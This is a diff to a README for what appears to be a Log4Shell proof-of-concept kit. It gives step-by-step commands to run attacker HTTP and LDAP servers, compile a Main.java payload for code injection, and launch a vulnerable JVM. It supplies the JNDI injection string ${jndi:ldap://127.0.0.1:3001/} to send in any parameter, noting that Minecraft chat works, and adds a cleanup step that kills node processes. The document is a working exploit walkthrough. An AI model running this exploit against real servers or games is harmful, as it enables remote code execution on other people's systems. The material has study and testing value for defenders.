@@ -11,33 +11,39 @@
 ```
 # system requirements => requirements.txt (gradle is not per say required, use any building tool with same output)
 # npm requirements => npm-requirements.txt
-$ cd http-server && npm install && cd ../ldap-server && npm install
+cd http-server && npm install && cd ../ldap-server && npm install
 ```
 1. run `http-server` and `ldap-server` both
 ```
-$ DATE=$(date +%H-%M-%S_%d-%m-%Y) &&\
-	   cd http-server && node index.js 2>&1 >$DATE_http-server.log & &&\
-	   cd ldap-server && node index.js 2>&1 >$DATE_ldap-server.log &
+cd http-server && node index.js 2>&1 &
+cd ldap-server && node index.js 2>&1 &
 ```
 2. Compile Main.java
 ```bash
 # This will generate Main.java - required to code injection .
 # OSx
-$ ./java-single-compile Main.java
+./java-single-compile <Main.java>
 # Linux 
-$ javac Main.java
+javac <Main.java>
 ```
 3. Start jvm with parameters
 ```bash
 # You can still use log4j-client in repo for internal testing.
-$ cd log4j-client &&\
+cd log4j-client &&\
 		gradle jar &&\
 		java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar build/libs/log4j-client-1.0-SNAPSHOT.jar
 # Or run other application, com.sun.jndi.ldap.object.trustURLCodebase=true required for code injection, otherwise it will only request to ldap server.
-$ java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar <javafile.jar>
+java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar <javafile.jar>
 ```
 4. Send `${jndi:ldap://127.0.0.1:3001/}` to any parameters as the payload
 (In minecraft, just chatting this will work if exploit's working.)
+5. cleanup
+```
+NODEP=`pgrep node`
+for id in $NODEP; do
+    kill $id
+done
+```
 
 ## References
 - https://github.com/apache/logging-log4j2/pull/608
